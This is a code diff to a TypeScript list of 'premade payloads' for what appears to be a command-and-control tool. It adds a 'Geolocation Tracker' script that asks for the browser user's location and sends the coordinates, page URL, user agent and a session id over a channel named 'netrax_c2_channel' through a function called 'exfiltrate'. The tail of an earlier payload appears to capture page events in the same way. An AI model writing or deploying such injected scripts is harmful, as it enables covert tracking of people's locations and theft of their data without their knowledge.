@@ -1,4 +1,3 @@
-
 import type { JsPayload } from '@/components/javascript-library';
 
 export const PREMADE_PAYLOADS: JsPayload[] = [
@@ -85,6 +84,37 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
             timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
         });
     }, true);
+})();
+`.trim(),
+    },
+    {
+        name: "Geolocation Tracker",
+        description: "Requests the user's location and sends the coordinates back.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+
+    if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                exfiltrate('location', { 
+                    latitude: position.coords.latitude, 
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                });
+            },
+            (error) => {
+                exfiltrate('location', { error: error.message });
+            }
+        );
+    } else {
+        exfiltrate('location', { error: 'Geolocation is not supported by this browser.' });
+    }
 })();
 `.trim(),
     },
